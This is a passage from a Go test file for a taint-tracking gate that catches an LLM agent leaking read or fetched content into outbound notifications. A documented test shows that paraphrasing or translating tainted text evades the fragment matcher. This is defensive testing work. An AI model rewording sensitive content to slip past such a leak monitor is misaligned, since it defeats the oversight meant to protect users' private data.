		t.Fatal("threshold above 8 must be clamped back to the contract floor")
	}
}

func TestFragmentThresholdStricterAllowed(t *testing.T) {
	// 用户只能调严: a stricter (smaller) window is permitted. The shared
	// contiguous run here is exactly 6 runes ("shared"), which the contract
	// floor (8) misses but a stricter config catches.
	p := NewProvenance(ProvOptions{NoProbe: true, MinFragmentChars: 6})
	p.OpenScope("s")
	p.Mark("s", SrcFSRead, "/f", "shared tail words")
	if _, ok := p.Inspect("s", "notify", map[string]any{"text": "see shared now"}); !ok {
		t.Fatal("stricter 6-char config must catch a 6-char leak")
	}
	p2 := NewProvenance(ProvOptions{NoProbe: true}) // default contract floor
	p2.OpenScope("s")
	p2.Mark("s", SrcFSRead, "/f", "shared tail words")
	if _, ok := p2.Inspect("s", "notify", map[string]any{"text": "see shared now"}); ok {
		t.Fatal("contract floor must match only >=8-char fragments")
	}
}

func TestResidualLimitsAreLoggedNotSilent(t *testing.T) {
	var logged []string
	old := Logf
	Logf = func(f string, a ...any) { logged = append(logged, f) }
	defer func() { Logf = old }()

	p := NewProvenance(ProvOptions{NoProbe: true, MaxSourceRunes: 32})
	p.OpenScope("s")
	long := strings.Repeat("a", 100) + marker
	if !p.Mark("s", SrcFSRead, "/big", long) {
		t.Fatal("oversized source must still be marked (truncated)")
	}
	if _, ok := p.Inspect("s", "notify", map[string]any{"text": marker}); ok {
		t.Error("fragment past the truncation cap is the documented residual gap")
	}
	if !anyContains(logged, "MaxSourceRunes") {
		t.Errorf("truncation must be logged, not silent: %v", logged)
	}
}

// --- concurrency ---------------------------------------------------------------

func TestConcurrentMarkInspect(t *testing.T) {
	p := testProv(t, baseOptions(t))
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func(n int) { // test-only goroutine (d22scan exempts _test.go)
			defer wg.Done()
			p.Mark("task-1", SrcWebFetch, "https://x", marker+string(rune('a'+n)))
			p.Inspect("task-1", "notify", map[string]any{"text": "leak " + marker})
			p.ScopeTaints("task-1")
		}(i)
	}
	wg.Wait()
	if len(p.ScopeTaints("task-1")) != 8 {
		t.Fatalf("all 8 marks kept, got %d", len(p.ScopeTaints("task-1")))
	}
}

// --- documented residual risk (AC #3) -----------------------------------------

// TestLLMParaphraseResidual locks the ACCEPTED limitation from 16.9#1: when
// the LLM rewrites/translates tainted content, no >=8-char contiguous fragment
// survives and C25 cannot match — the leak is logged, not blocked. Exact
// token-level taint tracking was REJECTED for this reason (PLAN §16.9 #1);
// the residual is back-stopped by D30 layers 2 (A/B blacklist hard-deny),
// 3 (outbound constraints) and 5 (first-visit domain prompt). This test
// asserts the miss (documented behavior), NOT a fix.
func TestLLMParaphraseResidual(t *testing.T) {
	p := testProv(t, baseOptions(t))
	p.Mark("task-1", SrcDocRead, "/contracts/acme.pdf", "the quarterly revenue increased by twelve percent")

	paraphrase := "公司收入比去年同期上涨约百分之十二（内部改写版）"
	hit, ok := p.Inspect("task-1", "notify", map[string]any{"text": paraphrase})
	if ok {
		t.Fatalf("paraphrase is expected to evade fragment matching (residual risk); got hit %+v", hit)
	}
	// But an unrewritten contiguous fragment still trips the gate.
	if _, ok := p.Inspect("task-1", "notify", map[string]any{"text": "quote: revenue increased by twelve percent"}); !ok {
		t.Fatal("verbatim contiguous fragment must still hit")
	}
}

func anyContains(list []string, sub string) bool {
	for _, s := range list {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}
